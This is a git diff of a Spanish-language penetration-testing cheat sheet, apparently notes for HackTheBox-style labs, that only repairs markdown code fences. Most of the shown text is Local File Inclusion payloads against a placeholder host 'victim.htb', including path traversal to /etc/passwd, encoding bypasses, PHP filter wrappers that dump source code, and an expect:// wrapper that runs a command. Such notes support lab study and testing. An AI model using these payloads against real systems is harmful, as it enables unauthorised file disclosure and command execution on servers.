@@ -67,7 +67,7 @@ Siendo vulnerable, podemos apuntar a otro fichero moviendonos entre directorios.
 
 **ByPass LFI**
 
-``
+```
 http://victim.htb/file.php?recurse=../../../../../etc/passwd% 
 
 http://victim.htb/file.php?recurse=../../../../../etc/passwd?
@@ -76,18 +76,18 @@ http://victim.htb/file.php?recurse=%252e%252e%252fetc%252fpasswd
 
 http://victim.htb/file.php?recurse=....//....//....//....//....//etc/passwd
 
-``
+```
 
 **Wrappers LFI**
 
-``
+```
 http://victim.htb/file.php?recurse=php://filter/read=string.rot13/resource=index.php
 
 http://victim.htb/file.php?recurse=php://filter/convert.base64-encode/resource=index.php
 
 http://victim.htb/file.php?recurse=expect://whoami
 
-``
+```
 
 
 # SNMP Enumeration 
